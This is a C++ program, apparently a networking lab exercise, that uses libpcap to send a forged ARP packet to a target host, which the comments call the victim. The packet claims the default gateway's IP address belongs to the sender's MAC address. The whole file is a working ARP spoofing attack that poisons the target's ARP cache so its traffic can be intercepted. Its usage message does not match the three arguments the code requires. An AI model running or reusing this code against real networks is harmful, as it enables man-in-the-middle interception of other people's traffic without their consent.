#include <cstdio>
#include <pcap.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <sstream>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <unistd.h>

using namespace std;

void getMacAddress(const char* iface, char* mac) {
    int fd;
    struct ifreq ifr;

    // 소켓 생성
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return;
    }

    // 인터페이스 이름 설정
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

    // 인터페이스의 MAC 주소를 가져오기 위해 ioctl 호출
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        return;
    }

    close(fd);

    // MAC 주소 형식화
    unsigned char* hwaddr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
        hwaddr[0], hwaddr[1], hwaddr[2],
        hwaddr[3], hwaddr[4], hwaddr[5]);
}

void getMacAddressForIp(const char* ip, const char* iface, char* mac) {
    int sockfd;
    struct arpreq req;
    struct sockaddr_in* sin;

    // 소켓 생성
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return;
    }

    // ARP 요청을 위한 초기화
    memset(&req, 0, sizeof(req));
    sin = (struct sockaddr_in*)&req.arp_pa;
    sin->sin_family = AF_INET;
    if (inet_pton(AF_INET, ip, &sin->sin_addr) <= 0) {
        perror("inet_pton");
        close(sockfd);
        return;
    }

    // 네트워크 인터페이스 지정
    strncpy(req.arp_dev, iface, IFNAMSIZ - 1);

    // SIOCGARP ioctl 호출로 ARP 요청
    if (ioctl(sockfd, SIOCGARP, &req) == -1) {
        perror("ioctl");
        close(sockfd);
        return;
    }

    close(sockfd);

    // MAC 주소 가져오기
    unsigned char* hwaddr = (unsigned char*)req.arp_ha.sa_data;
    sprintf(mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
        hwaddr[0], hwaddr[1], hwaddr[2],
        hwaddr[3], hwaddr[4], hwaddr[5]);
}

std::string getGatewayIp(const char* iface) {
    std::ifstream routeFile("/proc/net/route");
    std::string line;
    std::string gatewayIp;

    while (std::getline(routeFile, line)) {
        std::istringstream iss(line);
        std::string ifaceInFile, destination, gateway;
        int flags;

        if (!(iss >> ifaceInFile >> destination >> gateway >> std::hex >> flags))
            continue;

        if (ifaceInFile == iface && destination == "00000000") {
            unsigned long gatewayLong = std::stoul(gateway, nullptr, 16);
            struct in_addr ipAddr;
            ipAddr.s_addr = gatewayLong;
            gatewayIp = inet_ntoa(ipAddr);
            break;
        }
    }

    return gatewayIp;
}


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1,errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
	char* my_ip = argv[2];
	char* target_ip = argv[3];
	string gateway_ip = getGatewayIp(dev);

	char my_mac_buffer[18];
	char target_mac_buffer[18];
	char gateway_mac_buffer[18];

	getMacAddress(dev, my_mac_buffer);
	getMacAddressForIp(target_ip, dev, target_mac_buffer);
	getMacAddressForIp(gateway_ip.c_str(), dev, gateway_mac_buffer);

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");// arp request
	packet.eth_.smac_ = Mac(my_mac_buffer); // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);

	packet.arp_.smac_ = Mac(my_mac_buffer); //my mac
	packet.arp_.sip_ = htonl(Ip(gateway_ip)); // gateway ip
	packet.arp_.tmac_ = Mac(target_mac_buffer); // vim mac
	packet.arp_.tip_ = htonl(Ip(target_ip)); // vim ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}
	
